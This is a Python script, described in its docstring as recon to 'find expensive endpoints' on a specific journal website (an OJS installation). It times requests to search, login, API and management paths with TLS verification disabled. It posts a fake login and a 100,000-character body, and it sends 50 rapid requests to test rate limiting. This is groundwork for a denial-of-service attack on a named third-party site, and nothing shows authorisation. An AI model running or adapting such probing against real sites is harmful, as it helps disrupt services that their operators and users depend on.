"""Recon target to find expensive endpoints."""
import sys, time, urllib3
urllib3.disable_warnings()
sys.path.insert(0, '.')
import requests as r

t = 'https://ojs.phb.ac.id'
headers = {'User-Agent': 'Mozilla/5.0'}

# 1. Basic check
print('=== BASIC CHECK ===')
t0 = time.time()
resp = r.get(t, headers=headers, timeout=10, verify=False)
print('Status:', resp.status_code)
print('Time:', round(time.time()-t0, 3))
print('Server:', resp.headers.get('Server','?'))
print('Length:', len(resp.content))
print()

# 2. Find expensive endpoints
print('=== EXPENSIVE ENDPOINTS ===')
endpoints = [
    '/search?query=' + 'a' * 200,
    '/login',
    '/index.php/index/login',
    '/api/v1/submissions',
    '/api/v1/stats/publications',
    '/api/v1/contexts',
    '/api/v1/users',
    '/management/settings/website',
    '/management/settings/workflow',
    '/management/settings/distribution',
]
for ep in endpoints:
    try:
        t0 = time.time()
        resp = r.get(t + ep, headers=headers, timeout=10, verify=False)
        elapsed = time.time() - t0
        print(f'  {ep[:45]:45s} {resp.status_code} in {elapsed:.3f}s ({len(resp.content)}b)')
    except Exception as e:
        print(f'  {ep[:45]:45s} ERROR: {str(e)[:30]}')
print()

# 3. POST to login (slow endpoint)
print('=== SLOW POST ===')
login_data = {'username': 'fakeuser_'+str(int(time.time())), 'password': 'fakepass'}
t0 = time.time()
resp = r.post(t+'/login', data=login_data, headers=headers, timeout=10, verify=False)
print('POST /login:', resp.status_code, 'in', round(time.time()-t0, 3), 's')

# Try POST with large body
big_data = {'test': 'x' * 100000}
t0 = time.time()
resp = r.post(t+'/search', data=big_data, headers=headers, timeout=10, verify=False)
print('POST /search (100k body):', resp.status_code, 'in', round(time.time()-t0, 3), 's')
print()

# 4. Check rate limits
print('=== RATE LIMIT TEST (50 rapid requests) ===')
t0 = time.time()
oks = 0
for i in range(50):
    try:
        resp = r.get(t + '/search?q=' + str(i), headers=headers, timeout=5, verify=False)
        if resp.status_code < 500:
            oks += 1
    except:
        pass
print(f'{oks}/50 OK in {round(time.time()-t0, 1)}s')
